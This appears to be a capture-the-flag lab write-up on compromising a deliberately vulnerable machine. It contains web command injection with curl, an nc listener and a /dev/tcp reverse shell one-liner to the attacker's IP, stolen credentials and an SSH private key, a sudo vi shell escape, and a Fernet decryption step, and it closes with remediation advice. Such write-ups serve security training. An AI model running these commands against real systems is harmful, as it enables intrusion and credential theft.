Execution Steps
1. Reconnaissance and Vulnerability Discovery
Target IP Address: 10.201.75.222

Attacker IP Address: 10.201.44.153

Initial Scanning:

bash
nmap -sC -sV 10.201.75.222
Results:

Port 21/FTP: Anonymous authentication enabled

Port 80/HTTP: Apache web server running

Port 113: Contained critical path disclosure vulnerability

Web Directory Enumeration:

bash
gobuster dir -u http://10.201.75.222/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,html
Critical Discoveries:

/home.php - Unauthenticated command injection vulnerability

/validate.php - Configuration file containing plaintext credentials

2. Initial Compromise
Credential Extraction:

bash
curl -X POST http://10.201.75.222/home.php --data "command=cat /var/www/html/validate.php"
Compromised Credentials:

Username: charlie

Password: cn7824

Reverse Shell Establishment:

bash
Attacker listener
nc -nvlp 1234

Command injection payload
bash -c 'exec bash -i &>/dev/tcp/10.201.44.153/1234 <&1'
3. Privilege Escalation Path
SSH Key Discovery:

bash
cd /home/charlie
ls -la
Directory Contents:

teleport - Private SSH key (RSA)

teleport.pub - Public SSH key

user.txt - User flag (restricted access)

Key Extraction:

bash
cat /home/charlie/teleport
Private Key Content:

text
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
[...full key content...]
-----END RSA PRIVATE KEY-----
4. Preparation for Final Access
The private key was successfully manually copied and stored in the teleport file on the attacking machine. Appropriate permissions were set:

bash
chmod 600 teleport
Next Steps
Establish SSH connection using the compromised private key

Retrieve user flag (user.txt)

Exploit sudo misconfiguration for privilege escalation

Obtain root flag (root.txt)

FINAL 
Attack Chain Summary
Phase 1: Initial Access
Technique: Web Directory Enumeration

Command:

bash
gobuster dir -u http://10.201.122.107/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,html
Finding: Discovered /home.php with command injection capability

Phase 2: Reverse Shell Establishment
Technique: Remote Code Execution via Command Injection

Local Listener:

bash
nc -nvlp 1234
Payload Executed:

text
bash -c 'exec bash -i &>/dev/tcp/10.201.30.228/1234 <&1'
Phase 3: Lateral Movement
Technique: SSH Private Key Compromise

Key Location: /home/charlie/teleport

Transfer Method: Base64 encoding/decoding

SSH Access:

bash
chmod 600 teleport
ssh -i teleport charlie@10.201.122.107
Phase 4: Privilege Escalation
Technique: Sudo Misconfiguration Abuse

Vulnerable Command: vi with sudo privileges

Exploitation:

bash
sudo vi -c ':!/bin/sh' /dev/null
Phase 5: Final Flag Extraction
Method: Cryptographic Decryption

Key: -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=

Encrypted Data: gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ

Decryption Command:

python
from cryptography.fernet import Fernet
f = Fernet(key)
print(f.decrypt(encrypted_mess).decode())
Critical Vulnerabilities Identified
Unauthenticated RCE via web command injection

Plaintext credential storage in web-accessible files

SSH private key exposure with inadequate protection

Sudo misconfiguration allowing privilege escalation

Insecure cryptographic implementation with hardcoded keys

Security Recommendations
Implement input validation and sanitization for web applications

Remove unnecessary sudo privileges for service accounts

Store sensitive credentials using secure secret management

Conduct regular security assessments and penetration testing

Implement network segmentation and access controls
The assessment successfully identified and exploited a critical remote code execution vulnerability in the web application. Unauthorized access was achieved through command injection, leading to the compromise of sensitive authentication credentials and cryptographic material. The obtained SSH private key provides a persistent access mechanism to the target environment.
